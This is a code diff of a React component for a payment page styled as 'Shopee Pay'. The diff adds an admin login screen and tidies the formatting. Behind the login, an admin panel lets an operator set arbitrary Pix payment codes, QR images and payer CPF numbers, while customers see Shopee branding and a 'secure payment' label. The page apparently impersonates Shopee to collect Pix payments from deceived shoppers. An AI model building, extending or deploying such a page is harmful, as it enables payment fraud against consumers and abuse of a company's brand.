@@ -39,7 +39,9 @@ const EyeOffIcon = () => (
   <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
     <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
   </svg>
-);const ShopeePixPayment = () => {
+);
+
+const ShopeePixPayment = () => {
   const [isAdmin, setIsAdmin] = useState(false);
   const [showLogin, setShowLogin] = useState(false);
   const [loginData, setLoginData] = useState({ username: '', password: '' });
@@ -178,28 +180,99 @@ const EyeOffIcon = () => (
     if (!cpf) return '';
     const numbers = cpf.replace(/\D/g, '');
     return numbers.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
-  };// TELA DE LOGIN
+  };
+
+  // TELA DE LOGIN
   if (showLogin && !isAdmin) {
     return (
+      <div className="min-h-screen bg-gradient-to-br from-orange-100 via-red-50 to-orange-50 flex items-center justify-center p-4">
+        <div className="bg-white rounded-2xl shadow-2xl p-8 w-full max-w-md">
+          <div className="text-center mb-8">
+            <div className="inline-flex items-center justify-center w-20 h-20 bg-gradient-to-br from-orange-500 to-red-500 rounded-2xl mb-4 shadow-lg">
+              <LockIcon />
+            </div>
+            <h1 className="text-3xl font-bold text-gray-800 mb-2">Área Administrativa</h1>
+            <p className="text-gray-600">Acesso restrito aos administradores</p>
+          </div>
+          <div className="space-y-4">
+            <div>
+              <label className="block text-sm font-semibold text-gray-700 mb-2">Usuário</label>
+              <input
+                type="text"
+                value={loginData.username}
+                onChange={(e) => setLoginData({...loginData, username: e.target.value})}
+                onKeyPress={(e) => e.key === 'Enter' && handleLogin()}
+                className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-orange-500 focus:outline-none transition"
+                placeholder="Digite seu usuário"
+                disabled={loading}
+              />
+            </div>
+            <div>
+              <label className="block text-sm font-semibold text-gray-700 mb-2">Senha</label>
+              <div className="relative">
+                <input
+                  type={showPassword ? "text" : "password"}
+                  value={loginData.password}
+                  onChange={(e) => setLoginData({...loginData, password: e.target.value})}
+                  onKeyPress={(e) => e.key === 'Enter' && handleLogin()}
+                  className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-orange-500 focus:outline-none transition pr-12"
+                  placeholder="Digite sua senha"
+                  disabled={loading}
+                />
+                <button
+                  onClick={() => setShowPassword(!showPassword)}
+                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
+                  type="button"
+                >
+                  {showPassword ? <EyeOffIcon /> : <EyeIcon />}
+                </button>
+              </div>
+            </div>
+            {loginError && (
+              <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg text-sm">
+                {loginError}
+              </div>
+            )}
+            <button
+              onClick={handleLogin}
+              disabled={loading}
+              className="w-full bg-gradient-to-r from-orange-500 to-red-500 text-white py-3 rounded-lg font-bold text-lg hover:from-orange-600 hover:to-red-600 transition shadow-lg disabled:opacity-50"
+            >
+              {loading ? 'Entrando...' : 'Entrar'}
+            </button>
+            <button
+              onClick={() => { setShowLogin(false); window.location.hash = ''; }}
+              className="w-full bg-gray-200 text-gray-700 py-3 rounded-lg font-semibold hover:bg-gray-300 transition"
+            >
+              Voltar para Pagamentos
+            </button>
+          </div>
+        </div>
+      </div>
+    );
+  }
+
+  if (isAdmin) {
+    return <AdminPanel onLogout={handleLogout} authToken={authToken} loadPayments={loadPayments} />;
+  }
+
+  // TELA DO CLIENTE (PAGAMENTO)
+  return (
     <div className="min-h-screen bg-gray-100">
-      {/* HEADER COM LOGO CORRIGIDA */}
       <div className="bg-gradient-to-r from-orange-500 via-orange-600 to-red-500 shadow-lg">
         <div className="max-w-2xl mx-auto px-4 py-4">
           <div className="flex items-center gap-3">
-            {/* Container da Logo */}
             <div className="w-12 h-12 rounded-xl shadow-lg overflow-hidden bg-white p-1.5 flex items-center justify-center">
               <img 
                 src="./shopee-logo.png" 
                 alt="Shopee Logo" 
                 className="w-full h-full object-contain"
                 onError={(e) => {
-                  // Se a imagem não carregar, mostra o fallback
                   e.target.onerror = null;
                   e.target.src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect width="100" height="100" fill="%23EE4D2D"/><text x="50" y="70" font-size="60" font-weight="bold" text-anchor="middle" fill="white" font-family="Arial">S</text></svg>';
                 }}
               />
             </div>
-            {/* Texto ao lado da logo */}
             <div>
               <h1 className="text-2xl font-bold text-white tracking-tight">Shopee Pay</h1>
               <p className="text-xs text-orange-100">Pagamento Seguro</p>
@@ -207,8 +280,6 @@ const EyeOffIcon = () => (
           </div>
         </div>
       </div>
-
-      {/* RESTO DO CONTEÚDO */}
       <div className="max-w-lg mx-auto p-4">
         <div className="bg-white rounded-lg shadow-md overflow-hidden mt-4">
           <div className="bg-gray-50 border-b border-gray-200 px-5 py-4">
@@ -315,8 +386,9 @@ const EyeOffIcon = () => (
       </div>
     </div>
   );
-};// ADMIN PANEL COMPONENT
+};
 
+// ADMIN PANEL COMPONENT
 const AdminPanel = ({ onLogout, authToken, loadPayments }) => {
   const [payments, setPayments] = useState([]);
   const [showForm, setShowForm] = useState(false);
@@ -441,7 +513,8 @@ const AdminPanel = ({ onLogout, authToken, loadPayments }) => {
     if (value.length <= 11) {
       setFormData({...formData, cpfPagador: value});
     }
-  };// ADMIN PANEL - RENDER HTML
+  };
+
   return (
     <div className="min-h-screen bg-gradient-to-br from-orange-50 to-red-50">
       <div className="bg-gradient-to-r from-orange-500 to-red-500 text-white p-4 shadow-lg">
@@ -489,7 +562,8 @@ const AdminPanel = ({ onLogout, authToken, loadPayments }) => {
                 <div className="md:col-span-2">
                   <label className="block text-sm font-semibold text-gray-700 mb-2">Código Pix (Copia e Cola) *</label>
                   <textarea value={formData.pixCode} onChange={(e) => setFormData({...formData, pixCode: e.target.value})} className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-orange-500 focus:outline-none h-28 font-mono text-sm" placeholder="00020126330014br.gov.bcb.pix..." />
-                </div><div className="md:col-span-2">
+                </div>
+                <div className="md:col-span-2">
                   <label className="block text-sm font-semibold text-gray-700 mb-2">Imagem do QR Code (opcional)</label>
                   <div className="border-2 border-dashed border-orange-300 rounded-lg p-6 hover:border-orange-500 transition bg-white">
                     <input type="file" accept="image/*" onChange={handleImageUpload} className="hidden" id="qr-upload" />
@@ -524,7 +598,8 @@ const AdminPanel = ({ onLogout, authToken, loadPayments }) => {
                 </button>
               </div>
             </div>
-          )}<div className="space-y-3">
+          )}
+          <div className="space-y-3">
             {payments.length === 0 ? (
               <div className="text-center py-12">
                 <div className="w-20 h-20 bg-gray-100 rounded-full flex items-center justify-center mx-auto mb-4">
